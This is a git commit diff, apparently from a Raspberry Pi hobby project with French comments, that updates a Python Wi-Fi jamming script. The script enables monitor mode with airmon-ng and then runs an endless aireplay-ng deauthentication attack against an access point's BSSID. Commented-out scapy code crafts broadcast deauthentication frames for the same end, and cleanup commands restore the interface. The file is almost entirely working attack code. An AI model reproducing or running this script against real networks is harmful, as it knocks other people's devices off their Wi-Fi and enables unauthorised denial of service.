56a048559305b6ae98caaee6650249ef23fc08fa
root <root@localhost.localdomain>
2019-04-09 15:24:59 +0200

    deuxieme mise à jour Jamming

--- Rasberry/jamming.py
+++ Rasberry/jamming.py
@@ -12,36 +12,38 @@ BSSID = utile.getAPMac()
 subprocess.call('clear', shell=True)
 subprocess.call('airmon-ng ckeck kill',shell=True)
 
-print('Cartes disponibles ....')
+print('Card available ....')
 subprocess.call('airmon-ng',shell=True)
 
 networkCard = "wlan0"
 
-subprocess.call('airmon-ng start {} 6'.format(networkCard), shell=True)
+subprocess.call('airmon-ng start {} 1'.format(networkCard), shell=True)
 subprocess.call('airmon-ng check kill', shell=True)
 
-networkCard = '{}mon'.format(networkCard)
+networkCardMon = '{}mon'.format(networkCard)
 
 # try:
 #     subprocess.call('clear',shell=True)
 #     print('Scan ...')
 #     subprocess.call('airodump-ng {}'.format(networkCard),shell=True)
 #     time.sleep(7)
-#     killAiroDump("airodump")
 # except KeyboardInterrupt:
 #     print(''*3)
 #
 # brdMac = 'ff:ff:ff:ff:ff:ff'
+#subprocess.call("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCard),shell=True)
+#packet = RadioTap() / Dot11(addr1= brdMac, addr2=BSSID,addr3= BSSID)/Dot11Deauth()
+#sendp(packet,iface = networkCard, count= 1000,inter= 0.2)
 
 while True:
-    #subprocess.call("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCard),shell=True)
-    os.system("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCard))
+    try:
+        os.system("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCardMon))
+    except KeyboardInterrupt:
+        break
 
-    #packet = RadioTap() / Dot11(addr1= brdMac, addr2=BSSID,addr3= BSSID)/Dot11Deauth()
-    #sendp(packet,iface = networkCard, count= 1000,inter= 0.2)
-
+#Arreter le mode monitor et redemarrer la carte wifi
 print('Cleaning ...')
-subprocess.call("airmon-ng stop wlan0mon",shell=True)
-subprocess.call("ifconfig wlan0 up",shell=True)
+subprocess.call("airmon-ng stop {}".format(networkCardMon),shell=True)
+subprocess.call("ifconfig {} up".format(networkCard),shell=True)
 subprocess.call("service NetworkManager start",shell=True)
 subprocess.call('clear',shell=True)
